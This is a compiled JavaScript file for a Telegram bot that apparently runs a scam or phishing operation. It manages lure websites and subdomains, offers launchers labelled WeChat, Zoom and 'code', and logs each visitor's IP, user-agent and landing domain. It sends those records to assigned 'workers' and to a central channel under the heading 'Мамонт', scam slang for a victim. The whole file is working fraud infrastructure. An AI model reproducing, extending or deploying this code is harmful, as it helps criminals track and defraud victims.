"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.BotService = void 0;
const common_1 = require("@nestjs/common");
const config_service_1 = require("../config/config.service");
const telegraf_1 = require("telegraf");
const bot_inline_1 = require("./bot.inline");
const bot_middleware_1 = require("./bot.middleware");
const prisma_service_1 = require("../prisma/prisma.service");
const handle_start_1 = require("./handle/handle.start");
const handle_logs_1 = require("./handle/handle.logs");
const handle_profile_1 = require("./handle/handle.profile");
const handle_website_1 = require("./handle/handle.website");
const handle_site_1 = require("./handle/handle.site");
const handle_launch_1 = require("./handle/handle.launch");
let BotService = class BotService {
    constructor(config, prisma, handleStart, handleLogs, handleProfile, handleWebsite, hanldeSite, handleLaucnh) {
        this.config = config;
        this.prisma = prisma;
        this.handleStart = handleStart;
        this.handleLogs = handleLogs;
        this.handleProfile = handleProfile;
        this.handleWebsite = handleWebsite;
        this.hanldeSite = hanldeSite;
        this.handleLaucnh = handleLaucnh;
        this.logger = new common_1.Logger('BotService');
        this.init = () => {
            this.bot.use((0, telegraf_1.session)());
            const stage = new telegraf_1.Scenes.Stage([this.handleWebsite.scena()]);
            this.bot.use(stage.middleware());
            this.bot.use(new bot_middleware_1.BotMiddleware(this.prisma).validateUser.bind(this));
            this.bot.command('start', this.handleStart.action);
            this.bot.action(bot_inline_1.BotInline.profile, this.handleProfile.action);
            this.bot.action(bot_inline_1.BotInline.start, this.handleStart.action);
            this.bot.action(bot_inline_1.BotInline.logs, this.handleLogs.action);
            this.bot.action(new RegExp(`${bot_inline_1.BotInline.logs}_(\\d+)`), this.handleLogs.action);
            this.bot.action(bot_inline_1.BotInline.websites, this.handleWebsite.action);
            this.bot.action(new RegExp(`${bot_inline_1.BotInline.websites}_(\\d+)`), this.handleWebsite.actionById);
            this.bot.action(new RegExp(`${bot_inline_1.BotInline.subdomainAdd}_(\\d+)`), this.handleWebsite.actionSubDomainAdd);
            this.bot.action(new RegExp(`${bot_inline_1.BotInline.subdomain}_(\\d+)`), this.handleWebsite.subdomainById);
            this.bot.action(new RegExp(`${bot_inline_1.BotInline.subdomainDelete}_(\\d+)`), this.handleWebsite.subdomainDelete);
            this.bot.action(new RegExp(`${bot_inline_1.BotInline.site}_(\\d+)`), this.hanldeSite.action);
            this.bot.action(new RegExp(`${bot_inline_1.BotInline.siteSelect}_(\\d+)_(\\d+)`), this.hanldeSite.actionSelect);
            this.bot.action(bot_inline_1.BotInline.launcher, this.handleLaucnh.action);
            this.bot.action(bot_inline_1.BotInline.launcher_wechat, this.handleLaucnh.weChat);
            this.bot.action(bot_inline_1.BotInline.launcher_zoom, this.handleLaucnh.zoom);
            this.bot.action(bot_inline_1.BotInline.launcher_code, this.handleLaucnh.code);
        };
        this.newLog = async (id) => {
            const log = await this.prisma.log.findUnique({
                where: {
                    id,
                },
                select: {
                    id: true,
                    ip: true,
                    userAgent: true,
                    createdAt: true,
                    worker: {
                        select: {
                            id: true,
                            name: true,
                            telegramId: true,
                            username: true,
                        },
                    },
                    passCode: {
                        select: {
                            id: true,
                            createdAt: true,
                            worker: {
                                select: {
                                    id: true,
                                    name: true,
                                    telegramId: true,
                                    username: true,
                                },
                            },
                        },
                    },
                    subDomain: {
                        select: {
                            site: {
                                select: {
                                    id: true,
                                    name: true,
                                },
                            },
                            prefix: true,
                            domain: {
                                select: {
                                    domain: true,
                                },
                            },
                        },
                    },
                },
            });
            if (log.passCode) {
                this.bot.telegram.sendMessage(this.config.TELEGRAM_LOG, `🐘 <b>Мамонт</b>\n\n` +
                    `<b>ID</b>: ${log.id} (${log.passCode.worker.telegramId})\n` +
                    `<b>Работник</b>: ${log.passCode.worker.id} ${log.passCode.worker.name} @${log.passCode.worker.username}\n` +
                    `<b>Секретный код</b>: ${log.passCode.id}\n` +
                    `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
                    `<b>IP</b>: ${log.ip}\n` +
                    `<b>User-agent</b>: <code>${log.userAgent}</code>\n`, {
                    parse_mode: 'HTML',
                });
                this.bot.telegram.sendMessage(log.passCode.worker.telegramId, `🐘 <b>Мамонт</b>\n\n` +
                    `<b>ID</b>: ${log.id} (${log.passCode.worker.telegramId})\n` +
                    `<b>Секретный код</b>: ${log.passCode.id}\n` +
                    `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
                    `<b>IP</b>: ${log.ip}\n` +
                    `<b>User-agent</b>: <code>${log.userAgent}</code>\n`, {
                    parse_mode: 'HTML',
                });
            }
            else {
                this.bot.telegram.sendMessage(log.worker.telegramId, `🐘 <b>Мамонт</b>\n\n` +
                    `<b>ID</b>: ${log.id}\n` +
                    `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
                    `<b>IP</b>: ${log.ip}\n` +
                    `<b>Домен</b>: ${log.subDomain.prefix}.${log.subDomain.domain.domain}\n` +
                    `<b>Сайт</b>: ${log.subDomain.site.id} - ${log.subDomain.site.name}\n` +
                    `<b>User-agent</b>: <code>${log.userAgent}</code>\n`, {
                    parse_mode: 'HTML',
                });
                this.bot.telegram.sendMessage(this.config.TELEGRAM_LOG, `🐘 <b>Мамонт</b>\n\n` +
                    `<b>ID</b>: ${log.id} (${log.worker.telegramId})\n` +
                    `<b>Работник</b>: ${log.worker.id} ${log.worker.name} @${log.worker.username}\n` +
                    `<b>Дата и время</b>: ${log.createdAt.toISOString()}\n` +
                    `<b>IP</b>: ${log.ip}\n` +
                    `<b>Домен</b>: ${log.subDomain.prefix}.${log.subDomain.domain.domain}\n` +
                    `<b>Сайт</b>: ${log.subDomain.site.id} (${log.subDomain.site.name})\n` +
                    `<b>User-agent</b>: <code>${log.userAgent}</code>\n`, {
                    parse_mode: 'HTML',
                });
            }
        };
        this.bot = new telegraf_1.Telegraf(config.TELEGRAM_BOT_TOKEN);
        this.init();
        this.bot.launch();
    }
};
exports.BotService = BotService;
exports.BotService = BotService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [config_service_1.ConfigService,
        prisma_service_1.PrismaService,
        handle_start_1.HandleStart,
        handle_logs_1.HandleLogs,
        handle_profile_1.HandleProfile,
        handle_website_1.HandleWebSite,
        handle_site_1.HanldeSite,
        handle_launch_1.HandleLaunch])
], BotService);
//# sourceMappingURL=bot.service.js.map